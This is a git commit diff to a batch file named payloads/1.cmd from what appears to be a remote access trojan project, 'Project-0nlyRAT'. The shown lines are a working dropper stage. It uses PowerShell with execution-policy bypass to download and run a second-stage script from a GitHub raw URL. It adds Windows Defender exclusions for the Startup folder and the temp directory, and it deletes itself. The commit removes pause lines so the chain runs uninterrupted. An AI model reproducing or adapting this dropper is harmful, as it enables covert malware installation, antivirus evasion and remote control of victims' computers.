937ef0186dde8a41c11e2a7ff3cad328f011b886
Soumyo001 <www.soumyo@gmail.com>
2025-01-23 12:46:04 -0800

    obsf hard(fixed)

--- payloads/1.cmd
+++ payloads/1.cmd
@@ -38,8 +38,8 @@ REM rat resources
 
 REM Download and execute the installer script in an isolated environment, no connection with the parent pwsh
 powershell -noP -ep bypass start-process powershell.exe " {iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/2.ps1' -outfile '.\OVlqumatcNr.ps1';Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';Add-MpPreference -ExclusionPath $env:temp}"
-pause
+
 powershell -noP -ep bypass start-process powershell.exe ".\OVlqumatcNr.ps1"
 @REM powershell -ep bypass -noP start-process powershell.exe -windowstyle hidden ".\install.ps1"
-pause
+
 del wLMZNyTDPjiugBO.cmd
